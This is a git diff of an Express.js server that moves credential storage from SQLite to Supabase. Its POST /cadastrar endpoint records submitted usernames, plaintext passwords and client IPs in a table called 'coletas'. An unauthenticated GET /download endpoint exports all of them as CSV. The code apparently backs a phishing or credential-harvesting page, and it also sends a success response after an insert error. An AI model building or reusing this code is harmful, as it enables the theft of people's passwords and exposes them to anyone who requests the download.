@@ -1,37 +1,40 @@
 const express = require("express");
-const Database = require("better-sqlite3");
 const path = require("path");
 const app = express();
-const db = new Database("database.db");
 
-db.exec(`CREATE TABLE IF NOT EXISTS coletas (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    usuario TEXT,
-    senha TEXT,
-    data_hora DATETIME DEFAULT CURRENT_TIMESTAMP,
-    ip TEXT
-)`);
+require('dotenv').config();
+const { createClient } = require("@supabase/supabase-js");
+
+const supabaseUrl = process.env.SUPABASE_URL;
+const supabaseKey = process.env.SUPABASE_KEY;
+const supabase = createClient(supabaseUrl, supabaseKey);
 
 app.use(express.json());
 app.use(express.static("public"));
 
-app.post("/cadastrar", (req, res) => {
+app.post("/cadastrar", async (req, res) => {
     const { usuario, senha } = req.body;
     const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
 
-    try {
-        const stmt = db.prepare("INSERT INTO coletas (usuario, senha, ip) VALUES (?, ?, ?)");
-        stmt.run(usuario, senha, ip);
-        res.json({ status: 'success', mensagem: 'Senha registrada com sucesso!' });
+    const { error } = await supabase
+        .from('coletas')
+        .insert([
+            { usuario: usuario, senha: senha, ip: ip }
+        ]);
 
-    } catch (err) {
+    if (error) {
         res.status(500).json({ status: 'erro', mensagem: 'Erro ao salvar no banco.' });
-        console.log(err);
+        console.log(error);
     }
+
+    res.json({ status: 'success', mensagem: 'Senha registrada com sucesso!' });
 });
 
-app.get('/download', (req, res) => {
-    const rows = db.prepare("SELECT * FROM coletas").all();
+app.get('/download', async (req, res) => {
+    const {data:rows, error} = await supabase
+        .from('coletas')
+        .select('*');
+
     let csv = "\uFEFFID;Usuario;Senha;Data_Hora;IP\n";
     
     rows.forEach(row => {
@@ -43,4 +46,4 @@ app.get('/download', (req, res) => {
     res.status(200).send(csv);
 });
 
-app.listen(3000, () => console.log('Servidor rodando na porta 3000'));
+app.listen(process.env.PORT || 3000, () => console.log('Servidor rodando na porta 3000'));
